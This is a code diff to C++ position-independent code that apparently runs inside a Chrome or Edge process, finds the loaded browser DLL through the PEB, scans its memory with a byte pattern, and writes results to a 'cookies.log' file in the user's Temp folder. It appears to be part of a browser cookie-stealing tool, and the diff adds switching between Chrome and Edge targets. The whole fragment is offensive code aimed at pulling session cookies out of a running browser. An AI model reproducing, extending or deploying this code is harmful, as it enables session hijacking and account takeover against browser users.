@@ -4,12 +4,19 @@
 #include "GetProcAddress.h"
 #include "FileIO.h"
 #include "Memory.h"
+#include "win32.h"
 
 extern "C" {
 	void _code() {
 
-		Pointers ctx = {0};
+		//Uncomment me for Edge
+		//PICWARR(targetModule, "msedge.dll");
+		//Pointers ctx = { Config::Edge };
 
+		//Uncomment me for Chrome
+		PICWARR(targetModule, "chrome.dll");
+		 Pointers ctx = { Config::Chrome };
+		 
 		//File path will be "C:\Users\<Chrome_user>\AppData\Local\Temp\cookies.log"
 		PICARR(outputFileName, "cookies.log");
 
@@ -19,7 +26,14 @@ extern "C" {
 		PICARR(initdone, "[+] Init done");
 		WriteLineToFile(initdone , &ctx);
 
-		PICWARR(targetModule, "chrome.dll");
+		if (ctx.targetConfig == Config::Chrome) {
+			PICARR(configText, "[*] Using configuration: Chrome");
+			WriteLineToFile(configText, &ctx);
+		}
+		else {
+			PICARR(configText, "[*] Using configuration: Edge");
+			WriteLineToFile(configText, &ctx);
+		}
 
 		BYTE pattern[] = {
 			0xAA, 0xAA, 0xAA, 0xAA, 0xCC, 0xCC, 0xCC, 0xCC, 0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB,
@@ -33,7 +47,7 @@ extern "C" {
 			0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00,
 			0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB
 		};
-		
+
 		uintptr_t chromeDlladdress = 0;
 		DWORD modulesize = 0;
 		chromeDlladdress = (uintptr_t)GetLoadedDLLBasePEB(targetModule);
